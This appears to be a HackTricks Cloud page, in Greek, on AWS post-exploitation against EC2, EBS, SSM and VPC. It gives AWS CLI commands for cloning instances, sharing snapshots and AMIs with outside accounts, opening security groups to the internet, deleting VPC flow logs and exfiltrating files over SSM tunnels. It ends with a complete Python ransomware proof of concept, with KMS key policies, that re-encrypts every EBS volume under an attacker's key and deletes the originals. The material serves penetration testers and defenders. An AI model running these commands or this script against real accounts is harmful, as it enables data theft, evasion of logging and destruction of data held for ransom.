# AWS - EC2, EBS, SSM & VPC Post Exploitation

{{#include ../../../../banners/hacktricks-training.md}}

## EC2 & VPC

Για περισσότερες πληροφορίες δείτε:

{{#ref}}
../../aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/
{{#endref}}

### **Malicious VPC Mirror -** `ec2:DescribeInstances`, `ec2:RunInstances`, `ec2:CreateSecurityGroup`, `ec2:AuthorizeSecurityGroupIngress`, `ec2:CreateTrafficMirrorTarget`, `ec2:CreateTrafficMirrorSession`, `ec2:CreateTrafficMirrorFilter`, `ec2:CreateTrafficMirrorFilterRule`

Το VPC traffic mirroring **αντιγράφει την εισερχόμενη και εξερχόμενη κυκλοφορία για EC2 instances εντός ενός VPC** χωρίς την ανάγκη εγκατάστασης οτιδήποτε στα ίδια τα instances. Αυτή η αντιγραμμένη κυκλοφορία συνήθως αποστέλλεται σε κάτι σαν network intrusion detection system (IDS) για ανάλυση και παρακολούθηση.\
Ένας επιτιθέμενος θα μπορούσε να καταχραστεί αυτό για να καταγράψει όλη την κυκλοφορία και να αποκτήσει ευαίσθητες πληροφορίες από αυτή:

Για περισσότερες πληροφορίες δείτε αυτή τη σελίδα:

{{#ref}}
aws-malicious-vpc-mirror.md
{{#endref}}

### Copy Running Instance

Τα instances συνήθως περιέχουν κάποιο είδος ευαίσθητων πληροφοριών. Υπάρχουν διάφοροι τρόποι για να μπείτε (βλ. [EC2 privilege escalation tricks](../../aws-privilege-escalation/aws-ec2-privesc/README.md)). Ωστόσο, ένας άλλος τρόπος για να ελέγξετε τι περιέχει είναι να **create an AMI and run a new instance (even in your own account) from it**:
```shell
# List instances
aws ec2 describe-images

# create a new image for the instance-id
aws ec2 create-image --instance-id i-0438b003d81cd7ec5 --name "AWS Audit" --description "Export AMI" --region eu-west-1

# add key to AWS
aws ec2 import-key-pair --key-name "AWS Audit" --public-key-material file://~/.ssh/id_rsa.pub --region eu-west-1

# create ec2 using the previously created AMI, use the same security group and subnet to connect easily.
aws ec2 run-instances --image-id ami-0b77e2d906b00202d --security-group-ids "sg-6d0d7f01" --subnet-id subnet-9eb001ea --count 1 --instance-type t2.micro --key-name "AWS Audit" --query "Instances[0].InstanceId" --region eu-west-1

# now you can check the instance
aws ec2 describe-instances --instance-ids i-0546910a0c18725a1

# If needed : edit groups
aws ec2 modify-instance-attribute --instance-id "i-0546910a0c18725a1" --groups "sg-6d0d7f01"  --region eu-west-1

# be a good guy, clean our instance to avoid any useless cost
aws ec2 stop-instances --instance-id "i-0546910a0c18725a1" --region eu-west-1
aws ec2 terminate-instances --instance-id "i-0546910a0c18725a1" --region eu-west-1
```
### EBS Snapshot dump

**Snapshots are backups of volumes**, τα οποία συνήθως περιέχουν **ευαίσθητες πληροφορίες**, επομένως ο έλεγχός τους θα αποκαλύψει αυτές τις πληροφορίες.\
Αν βρείτε ένα **volume without a snapshot** μπορείτε να: **Create a snapshot** και να εκτελέσετε τις ακόλουθες ενέργειες ή απλώς **mount it in an instance** μέσα στο λογαριασμό:

{{#ref}}
aws-ebs-snapshot-dump.md
{{#endref}}

### Covert Disk Exfiltration via AMI Store-to-S3

Εξάγετε ένα EC2 AMI απευθείας σε S3 χρησιμοποιώντας `CreateStoreImageTask` για να αποκτήσετε ένα raw disk image χωρίς snapshot sharing. Αυτό επιτρέπει πλήρη offline forensics ή data theft ενώ αφήνει το networking του instance ανεπηρέαστο.

{{#ref}}
aws-ami-store-s3-exfiltration.md
{{#endref}}

### Live Data Theft via EBS Multi-Attach

Συνδέστε έναν io1/io2 Multi-Attach volume σε ένα δεύτερο instance και κάντε mount read-only για να αποσπάσετε live data χωρίς snapshots. Χρήσιμο όταν το volume του θύματος έχει ήδη Multi-Attach ενεργοποιημένο στην ίδια AZ.

{{#ref}}
aws-ebs-multi-attach-data-theft.md
{{#endref}}

### EC2 Instance Connect Endpoint Backdoor

Δημιουργήστε ένα EC2 Instance Connect Endpoint, εξουσιοδοτήστε ingress, και εισάγετε ephemeral SSH keys για πρόσβαση σε private instances μέσω ενός managed tunnel. Παρέχει γρήγορους δρόμους lateral movement χωρίς να ανοίγονται δημόσιες θύρες.

{{#ref}}
aws-ec2-instance-connect-endpoint-backdoor.md
{{#endref}}

### EC2 ENI Secondary Private IP Hijack

Μετακινήστε τη δευτερεύουσα private IP του ENI του θύματος σε ένα ENI που ελέγχεται από τον επιτιθέμενο για να μιμηθείτε trusted hosts που είναι allowlisted ανά IP. Επιτρέπει την παράκαμψη εσωτερικών ACLs ή SG κανόνων που βασίζονται σε συγκεκριμένες διευθύνσεις.

{{#ref}}
aws-eni-secondary-ip-hijack.md
{{#endref}}

### Elastic IP Hijack for Ingress/Egress Impersonation

Ανασυνδέστε ένα Elastic IP από το instance του θύματος στον επιτιθέμενο για να παρεμβληθείτε στην εισερχόμενη κίνηση ή να ξεκινήσετε εξερχόμενες συνδέσεις που φαίνεται να προέρχονται από trusted public IPs.

{{#ref}}
aws-eip-hijack-impersonation.md
{{#endref}}

### Security Group Backdoor via Managed Prefix Lists

Αν ένας κανόνας security group αναφέρεται σε ένα customer-managed prefix list, η προσθήκη attacker CIDRs στη λίστα επεκτείνει αθόρυβα την πρόσβαση σε κάθε εξαρτώμενο SG κανόνα χωρίς να τροποποιηθεί το ίδιο το SG.

{{#ref}}
aws-managed-prefix-list-backdoor.md
{{#endref}}

### VPC Endpoint Egress Bypass

Δημιουργήστε gateway ή interface VPC endpoints για να επανακτήσετε εξερχόμενη πρόσβαση από απομονωμένα subnets. Η χρήση AWS-managed private links παρακάμπτει ελλείποντες IGW/NAT ελέγχους για data exfiltration.

{{#ref}}
aws-vpc-endpoint-egress-bypass.md
{{#endref}}

### VPC Flow Logs Cross-Account Exfiltration

Διευθύνετε τα VPC Flow Logs σε ένα S3 bucket που ελέγχεται από τον επιτιθέμενο για να συλλέγετε συνεχώς network metadata (source/destination, ports) εκτός του λογαριασμού του θύματος για μακροπρόθεσμη αναγνώριση.

{{#ref}}
aws-vpc-flow-logs-cross-account-exfiltration.md
{{#endref}}

### Data Exfiltration

#### DNS Exfiltration

Ακόμα κι αν κλειδώσετε ένα EC2 ώστε να μην βγαίνει κίνηση, μπορεί να εξακολουθήσει να **exfil via DNS**.

- **VPC Flow Logs will not record this**.
- Δεν έχετε πρόσβαση στα AWS DNS logs.
- Απενεργοποιήστε αυτό θέτοντας "enableDnsSupport" σε false με:

`aws ec2 modify-vpc-attribute --no-enable-dns-support --vpc-id <vpc-id>`

#### Exfiltration via API calls

Ένας επιτιθέμενος μπορεί να καλέσει API endpoints ενός account που ελέγχει ο ίδιος. Cloudtrail θα καταγράψει αυτές τις κλήσεις και ο επιτιθέμενος θα μπορεί να δει τα exfiltrate δεδομένα στα Cloudtrail logs.

### Open Security Group

Μπορείτε να αποκτήσετε περαιτέρω πρόσβαση σε network services ανοίγοντας ports όπως αυτό:
```bash
aws ec2 authorize-security-group-ingress --group-id <sg-id> --protocol tcp --port 80 --cidr 0.0.0.0/0
# Or you could just open it to more specific ips or maybe th einternal network if you have already compromised an EC2 in the VPC
```
### Privesc to ECS

Είναι δυνατό να τρέξετε ένα EC2 instance και να το καταχωρήσετε ώστε να χρησιμοποιηθεί για την εκτέλεση ECS instances και στη συνέχεια να κλέψετε τα δεδομένα των ECS instances.

Για [**περισσότερες πληροφορίες δείτε αυτό**](../../aws-privilege-escalation/aws-ec2-privesc/README.md#privesc-to-ecs).

### Αφαίρεση VPC flow logs
```bash
aws ec2 delete-flow-logs --flow-log-ids <flow_log_ids> --region <region>
```
### SSM Port Forwarding

Απαιτούμενα δικαιώματα:

- `ssm:StartSession`

Επιπλέον της εκτέλεσης εντολών, το SSM επιτρέπει traffic tunneling το οποίο μπορεί να καταχραστεί για να pivot από EC2 instances που δεν έχουν πρόσβαση δικτύου λόγω Security Groups ή NACLs.
Ένα από τα σενάρια όπου αυτό είναι χρήσιμο είναι το pivoting από έναν [Bastion Host](https://www.geeksforgeeks.org/what-is-aws-bastion-host/) σε ένα ιδιωτικό EKS cluster.

> Για να ξεκινήσετε μια συνεδρία χρειάζεται να έχετε εγκαταστήσει το SessionManagerPlugin: https://docs.aws.amazon.com/systems-manager/latest/userguide/install-plugin-macos-overview.html

1. Εγκαταστήστε το SessionManagerPlugin στο μηχάνημά σας
2. Συνδεθείτε στο Bastion EC2 χρησιμοποιώντας την παρακάτω εντολή:
```shell
aws ssm start-session --target "$INSTANCE_ID"
```
3. Πάρε τα προσωρινά credentials του Bastion EC2 AWS με το script [Abusing SSRF in AWS EC2 environment](https://book.hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf.html#abusing-ssrf-in-aws-ec2-environment)
4. Μετέφερε τα credentials στο δικό σου μηχάνημα στο αρχείο `$HOME/.aws/credentials` ως προφίλ `[bastion-ec2]`
5. Συνδέσου στο EKS ως το Bastion EC2:
```shell
aws eks update-kubeconfig --profile bastion-ec2 --region <EKS-CLUSTER-REGION> --name <EKS-CLUSTER-NAME>
```
6. Ενημερώστε το πεδίο `server` στο αρχείο `$HOME/.kube/config` ώστε να δείχνει σε `https://localhost`  
7. Δημιουργήστε ένα SSM tunnel ως εξής:
```shell
sudo aws ssm start-session --target $INSTANCE_ID --document-name AWS-StartPortForwardingSessionToRemoteHost --parameters '{"host":["<TARGET-IP-OR-DOMAIN>"],"portNumber":["443"], "localPortNumber":["443"]}' --region <BASTION-INSTANCE-REGION>
```
8. Η κίνηση από το εργαλείο `kubectl` προωθείται τώρα μέσω του SSM tunnel μέσω του Bastion EC2 και μπορείτε να αποκτήσετε πρόσβαση στο ιδιωτικό EKS cluster από τον δικό σας υπολογιστή εκτελώντας:
```shell
kubectl get pods --insecure-skip-tls-verify
```
Σημειώστε ότι οι συνδέσεις SSL θα αποτύχουν εκτός αν ορίσετε την παράμετρο `--insecure-skip-tls-verify ` (ή το αντίστοιχό της σε εργαλεία audit του K8s). Εφόσον η κίνηση δρομολογείται μέσω του ασφαλούς AWS SSM tunnel, είστε προστατευμένοι από οποιαδήποτε μορφή επιθέσεων MitM.

Τέλος, αυτή η τεχνική δεν είναι συγκεκριμένη για επιθέσεις σε private EKS clusters. Μπορείτε να ορίσετε αυθαίρετα domains και ports για να κάνετε pivot σε οποιαδήποτε άλλη υπηρεσία AWS ή σε μια προσαρμοσμένη εφαρμογή.

---

#### Quick Local ↔️ Remote Port Forward (AWS-StartPortForwardingSession)

Αν χρειάζεται μόνο να προωθήσετε **μία TCP θύρα από το EC2 instance προς τον τοπικό σας υπολογιστή** μπορείτε να χρησιμοποιήσετε το SSM document `AWS-StartPortForwardingSession` (δεν απαιτείται παράμετρος remote host):
```bash
aws ssm start-session --target i-0123456789abcdef0 \
--document-name AWS-StartPortForwardingSession \
--parameters "portNumber"="8000","localPortNumber"="8000" \
--region <REGION>
```
Η εντολή δημιουργεί ένα αμφίδρομο tunnel ανάμεσα στον υπολογιστή εργασίας σας (`localPortNumber`) και την επιλεγμένη θύρα (`portNumber`) στο instance **χωρίς να ανοίξει κανόνες εισερχόμενων Security-Group**.

Συχνές περιπτώσεις χρήσης:

* **File exfiltration**
1. Στο instance, ξεκινήστε έναν γρήγορο HTTP server που δείχνει στον κατάλογο που θέλετε να exfiltrate:

```bash
python3 -m http.server 8000
```

2. Από τον υπολογιστή εργασίας σας, κατεβάστε τα αρχεία μέσω του SSM tunnel:

```bash
curl http://localhost:8000/loot.txt -o loot.txt
```

* **Accessing internal web applications (e.g. Nessus)**
```bash
# Forward remote Nessus port 8834 to local 8835
aws ssm start-session --target i-0123456789abcdef0 \
--document-name AWS-StartPortForwardingSession \
--parameters "portNumber"="8834","localPortNumber"="8835"
# Browse to http://localhost:8835
```
Συμβουλή: Compress και encrypt τα αποδεικτικά στοιχεία πριν από το exfiltrating, ώστε το CloudTrail να μην καταγράφει το clear-text content:
```bash
# On the instance
7z a evidence.7z /path/to/files/* -p'Str0ngPass!'
```
### Κοινή χρήση AMI
```bash
aws ec2 modify-image-attribute --image-id <image_ID> --launch-permission "Add=[{UserId=<recipient_account_ID>}]" --region <AWS_region>
```
### Αναζήτηση ευαίσθητων πληροφοριών σε δημόσιες και ιδιωτικές AMIs

- [https://github.com/saw-your-packet/CloudShovel](https://github.com/saw-your-packet/CloudShovel): Το CloudShovel είναι ένα εργαλείο σχεδιασμένο για να **αναζητά ευαίσθητες πληροφορίες σε δημόσιες ή ιδιωτικές Amazon Machine Images (AMIs)**. Αυτοματοποιεί τη διαδικασία εκκίνησης instances από τις στοχευόμενες AMIs, την προσάρτηση των volumes τους και τη σάρωση για πιθανά secrets ή ευαίσθητα δεδομένα.

### Κοινή χρήση EBS Snapshot
```bash
aws ec2 modify-snapshot-attribute --snapshot-id <snapshot_ID> --create-volume-permission "Add=[{UserId=<recipient_account_ID>}]" --region <AWS_region>
```
### EBS Ransomware PoC

Ένα proof of concept παρόμοιο με την επίδειξη Ransomware που περιγράφεται στις σημειώσεις post-exploitation για το S3. Το KMS θα έπρεπε να μετονομαστεί σε RMS (Ransomware Management Service), λόγω του πόσο εύκολο είναι να χρησιμοποιηθεί για να κρυπτογραφήσει διάφορες υπηρεσίες AWS.

Πρώτα, από έναν λογαριασμό AWS 'attacker', δημιούργησε ένα customer managed key στο KMS. Σ'αυτό το παράδειγμα θα αφήσουμε την AWS να διαχειρίζεται τα δεδομένα του κλειδιού για εμάς, αλλά σε ρεαλιστικό σενάριο ένας κακόβουλος φορέας θα κρατούσε τα δεδομένα του κλειδιού εκτός του ελέγχου της AWS. Αλλάξτε την key policy ώστε να επιτρέπει σε οποιονδήποτε AWS account Principal να χρησιμοποιεί το κλειδί. Για αυτή την key policy, το όνομα του λογαριασμού ήταν 'AttackSim' και ο κανόνας πολιτικής που επιτρέπει πλήρη πρόσβαση ονομάζεται 'Outside Encryption'
```
{
"Version": "2012-10-17",
"Id": "key-consolepolicy-3",
"Statement": [
{
"Sid": "Enable IAM User Permissions",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:root"
},
"Action": "kms:*",
"Resource": "*"
},
{
"Sid": "Allow access for Key Administrators",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Create*",
"kms:Describe*",
"kms:Enable*",
"kms:List*",
"kms:Put*",
"kms:Update*",
"kms:Revoke*",
"kms:Disable*",
"kms:Get*",
"kms:Delete*",
"kms:TagResource",
"kms:UntagResource",
"kms:ScheduleKeyDeletion",
"kms:CancelKeyDeletion"
],
"Resource": "*"
},
{
"Sid": "Allow use of the key",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Encrypt",
"kms:Decrypt",
"kms:ReEncrypt*",
"kms:GenerateDataKey*",
"kms:DescribeKey"
],
"Resource": "*"
},
{
"Sid": "Outside Encryption",
"Effect": "Allow",
"Principal": {
"AWS": "*"
},
"Action": [
"kms:Encrypt",
"kms:Decrypt",
"kms:ReEncrypt*",
"kms:GenerateDataKey*",
"kms:DescribeKey",
"kms:GenerateDataKeyWithoutPlainText",
"kms:CreateGrant"
],
"Resource": "*"
},
{
"Sid": "Allow attachment of persistent resources",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:CreateGrant",
"kms:ListGrants",
"kms:RevokeGrant"
],
"Resource": "*",
"Condition": {
"Bool": {
"kms:GrantIsForAWSResource": "true"
}
}
}
]
}
```
The key policy rule needs the following enabled to allow for the ability to use it to encrypt an EBS volume:

- `kms:CreateGrant`
- `kms:Decrypt`
- `kms:DescribeKey`
- `kms:GenerateDataKeyWithoutPlainText`
- `kms:ReEncrypt`

Τώρα με το δημόσια προσβάσιμο key προς χρήση. Μπορούμε να χρησιμοποιήσουμε έναν λογαριασμό 'victim' που έχει μερικά EC2 instances εκτελόμενα με μη κρυπτογραφημένα EBS volumes συνδεδεμένα. Τα EBS volumes αυτού του λογαριασμού 'victim' είναι ο στόχος μας για κρυπτογράφηση — αυτή η επίθεση γίνεται υπό την υπόθεση παραβίασης ενός λογαριασμού AWS με υψηλά προνόμια.

![Pasted image 20231231172655](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/5b9a96cd-6006-4965-84a4-b090456f90c6) ![Pasted image 20231231172734](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/4294289c-0dbd-4eb6-a484-60b4e4266459)

Παρόμοια με το παράδειγμα S3 ransomware. Αυτή η επίθεση θα δημιουργήσει αντίγραφα των συνδεδεμένων EBS volumes χρησιμοποιώντας snapshots, θα χρησιμοποιήσει το δημόσια διαθέσιμο key από τον λογαριασμό 'attacker' για να κρυπτογραφήσει τα νέα EBS volumes, στη συνέχεια θα αποσυνδέσει τα αρχικά EBS volumes από τα EC2 instances και θα τα διαγράψει, και τελικά θα διαγράψει τα snapshots που χρησιμοποιήθηκαν για τη δημιουργία των πρόσφατα κρυπτογραφημένων EBS volumes. ![Pasted image 20231231173130](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/34808990-2b3b-4975-a523-8ee45874279e)

Αυτό έχει ως αποτέλεσμα να παραμένουν διαθέσιμα στον λογαριασμό μόνο κρυπτογραφημένα EBS volumes.

![Pasted image 20231231173338](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/eccdda58-f4b1-44ea-9719-43afef9a8220)

Αξίζει επίσης να σημειωθεί ότι το script σταμάτησε τα EC2 instances για να αποσυνδέσει και να διαγράψει τα αρχικά EBS volumes. Τα αρχικά μη κρυπτογραφημένα volumes έχουν πλέον εξαφανιστεί.

![Pasted image 20231231173931](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/cc31a5c9-fbb4-4804-ac87-911191bb230e)

Στη συνέχεια, επιστρέψτε στην πολιτική κλειδιού του λογαριασμού 'attacker' και αφαιρέστε τον κανόνα πολιτικής 'Outside Encryption'.
```json
{
"Version": "2012-10-17",
"Id": "key-consolepolicy-3",
"Statement": [
{
"Sid": "Enable IAM User Permissions",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:root"
},
"Action": "kms:*",
"Resource": "*"
},
{
"Sid": "Allow access for Key Administrators",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Create*",
"kms:Describe*",
"kms:Enable*",
"kms:List*",
"kms:Put*",
"kms:Update*",
"kms:Revoke*",
"kms:Disable*",
"kms:Get*",
"kms:Delete*",
"kms:TagResource",
"kms:UntagResource",
"kms:ScheduleKeyDeletion",
"kms:CancelKeyDeletion"
],
"Resource": "*"
},
{
"Sid": "Allow use of the key",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Encrypt",
"kms:Decrypt",
"kms:ReEncrypt*",
"kms:GenerateDataKey*",
"kms:DescribeKey"
],
"Resource": "*"
},
{
"Sid": "Allow attachment of persistent resources",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": ["kms:CreateGrant", "kms:ListGrants", "kms:RevokeGrant"],
"Resource": "*",
"Condition": {
"Bool": {
"kms:GrantIsForAWSResource": "true"
}
}
}
]
}
```
Περιμένετε λίγο ώστε η νεορυθμισμένη key policy να διαδοθεί. Έπειτα επιστρέψτε στον 'victim' account και προσπαθήστε να επισυνάψετε ένα από τα πρόσφατα κρυπτογραφημένα EBS volumes. Θα διαπιστώσετε ότι μπορείτε να επισυνάψετε το volume.

![Pasted image 20231231174131](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/ba9e5340-7020-4af9-95cc-0e02267ced47) ![Pasted image 20231231174258](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/6c3215ec-4161-44e2-b1c1-e32f43ad0fa4)

Ωστόσο, όταν προσπαθήσετε να επανεκκινήσετε πράγματι το EC2 instance με το κρυπτογραφημένο EBS volume, θα αποτύχει και θα μεταβεί από την κατάσταση 'pending' πίσω στην κατάσταση 'stopped' επ' αόριστον, καθώς το επισυναπτόμενο EBS volume δεν μπορεί να αποκρυπτογραφηθεί με το key επειδή η key policy πλέον δεν το επιτρέπει.

![Pasted image 20231231174322](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/73456c22-0828-4da9-a737-e4d90fa3f514) ![Pasted image 20231231174352](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/4d83a90e-6fa9-4003-b904-a4ba7f5944d0)

Αυτό είναι το python script που χρησιμοποιήθηκε. Παίρνει AWS creds για έναν 'victim' account και μια δημόσια διαθέσιμη AWS ARN τιμή για το key που θα χρησιμοποιηθεί για κρυπτογράφηση. Το script θα δημιουργήσει κρυπτογραφημένα αντίγραφα ΟΛΩΝ των διαθέσιμων EBS volumes που είναι προσαρτημένα σε ΟΛΑ τα EC2 instances στον στοχευόμενο AWS account, στη συνέχεια θα σταματήσει κάθε EC2 instance, θα αποσυνδέσει τα αρχικά EBS volumes, θα τα διαγράψει, και τέλος θα διαγράψει όλα τα snapshots που χρησιμοποιήθηκαν κατά τη διαδικασία. Αυτό θα αφήσει μόνο κρυπτογραφημένα EBS volumes στον στοχευόμενο 'victim' account. ΧΡΗΣΙΜΟΠΟΙΗΣΤΕ ΑΥΤΟ ΤΟ SCRIPT ΜΟΝΟ ΣΕ ΠΕΡΙΒΑΛΛΟΝ ΔΟΚΙΜΩΝ, ΕΙΝΑΙ ΚΑΤΑΣΤΡΟΦΙΚΟ ΚΑΙ ΘΑ ΔΙΑΓΡΑΨΕΙ ΟΛΑ ΤΑ ΑΡΧΙΚΑ EBS VOLUMES. Μπορείτε να τα ανακτήσετε χρησιμοποιώντας το χρησιμοποιημένο KMS key και να τα επαναφέρετε στην αρχική τους κατάσταση μέσω snapshots, αλλά θέλω απλώς να σας ενημερώσω ότι πρόκειται για ransomware PoC στο τέλος της ημέρας.
```
import boto3
import argparse
from botocore.exceptions import ClientError

def enumerate_ec2_instances(ec2_client):
instances = ec2_client.describe_instances()
instance_volumes = {}
for reservation in instances['Reservations']:
for instance in reservation['Instances']:
instance_id = instance['InstanceId']
volumes = [vol['Ebs']['VolumeId'] for vol in instance['BlockDeviceMappings'] if 'Ebs' in vol]
instance_volumes[instance_id] = volumes
return instance_volumes

def snapshot_volumes(ec2_client, volumes):
snapshot_ids = []
for volume_id in volumes:
snapshot = ec2_client.create_snapshot(VolumeId=volume_id)
snapshot_ids.append(snapshot['SnapshotId'])
return snapshot_ids

def wait_for_snapshots(ec2_client, snapshot_ids):
for snapshot_id in snapshot_ids:
ec2_client.get_waiter('snapshot_completed').wait(SnapshotIds=[snapshot_id])

def create_encrypted_volumes(ec2_client, snapshot_ids, kms_key_arn):
new_volume_ids = []
for snapshot_id in snapshot_ids:
snapshot_info = ec2_client.describe_snapshots(SnapshotIds=[snapshot_id])['Snapshots'][0]
volume_id = snapshot_info['VolumeId']
volume_info = ec2_client.describe_volumes(VolumeIds=[volume_id])['Volumes'][0]
availability_zone = volume_info['AvailabilityZone']

volume = ec2_client.create_volume(SnapshotId=snapshot_id, AvailabilityZone=availability_zone,
Encrypted=True, KmsKeyId=kms_key_arn)
new_volume_ids.append(volume['VolumeId'])
return new_volume_ids

def stop_instances(ec2_client, instance_ids):
for instance_id in instance_ids:
try:
instance_description = ec2_client.describe_instances(InstanceIds=[instance_id])
instance_state = instance_description['Reservations'][0]['Instances'][0]['State']['Name']

if instance_state == 'running':
ec2_client.stop_instances(InstanceIds=[instance_id])
print(f"Stopping instance: {instance_id}")
ec2_client.get_waiter('instance_stopped').wait(InstanceIds=[instance_id])
print(f"Instance {instance_id} stopped.")
else:
print(f"Instance {instance_id} is not in a state that allows it to be stopped (current state: {instance_state}).")

except ClientError as e:
print(f"Error stopping instance {instance_id}: {e}")

def detach_and_delete_volumes(ec2_client, volumes):
for volume_id in volumes:
try:
ec2_client.detach_volume(VolumeId=volume_id)
ec2_client.get_waiter('volume_available').wait(VolumeIds=[volume_id])
ec2_client.delete_volume(VolumeId=volume_id)
print(f"Deleted volume: {volume_id}")
except ClientError as e:
print(f"Error detaching or deleting volume {volume_id}: {e}")


def delete_snapshots(ec2_client, snapshot_ids):
for snapshot_id in snapshot_ids:
try:
ec2_client.delete_snapshot(SnapshotId=snapshot_id)
print(f"Deleted snapshot: {snapshot_id}")
except ClientError as e:
print(f"Error deleting snapshot {snapshot_id}: {e}")

def replace_volumes(ec2_client, instance_volumes):
instance_ids = list(instance_volumes.keys())
stop_instances(ec2_client, instance_ids)

all_volumes = [vol for vols in instance_volumes.values() for vol in vols]
detach_and_delete_volumes(ec2_client, all_volumes)

def ebs_lock(access_key, secret_key, region, kms_key_arn):
ec2_client = boto3.client('ec2', aws_access_key_id=access_key, aws_secret_access_key=secret_key, region_name=region)

instance_volumes = enumerate_ec2_instances(ec2_client)
all_volumes = [vol for vols in instance_volumes.values() for vol in vols]
snapshot_ids = snapshot_volumes(ec2_client, all_volumes)
wait_for_snapshots(ec2_client, snapshot_ids)
create_encrypted_volumes(ec2_client, snapshot_ids, kms_key_arn)  # New encrypted volumes are created but not attached
replace_volumes(ec2_client, instance_volumes)  # Stops instances, detaches and deletes old volumes
delete_snapshots(ec2_client, snapshot_ids)  # Optionally delete snapshots if no longer needed

def parse_arguments():
parser = argparse.ArgumentParser(description='EBS Volume Encryption and Replacement Tool')
parser.add_argument('--access-key', required=True, help='AWS Access Key ID')
parser.add_argument('--secret-key', required=True, help='AWS Secret Access Key')
parser.add_argument('--region', required=True, help='AWS Region')
parser.add_argument('--kms-key-arn', required=True, help='KMS Key ARN for EBS volume encryption')
return parser.parse_args()

def main():
args = parse_arguments()
ec2_client = boto3.client('ec2', aws_access_key_id=args.access_key, aws_secret_access_key=args.secret_key, region_name=args.region)

instance_volumes = enumerate_ec2_instances(ec2_client)
all_volumes = [vol for vols in instance_volumes.values() for vol in vols]
snapshot_ids = snapshot_volumes(ec2_client, all_volumes)
wait_for_snapshots(ec2_client, snapshot_ids)
create_encrypted_volumes(ec2_client, snapshot_ids, args.kms_key_arn)
replace_volumes(ec2_client, instance_volumes)
delete_snapshots(ec2_client, snapshot_ids)

if __name__ == "__main__":
main()
```
## Αναφορές

- [Pentest Partners – How to transfer files in AWS using SSM](https://www.pentestpartners.com/security-blog/how-to-transfer-files-in-aws-using-ssm/)

{{#include ../../../../banners/hacktricks-training.md}}
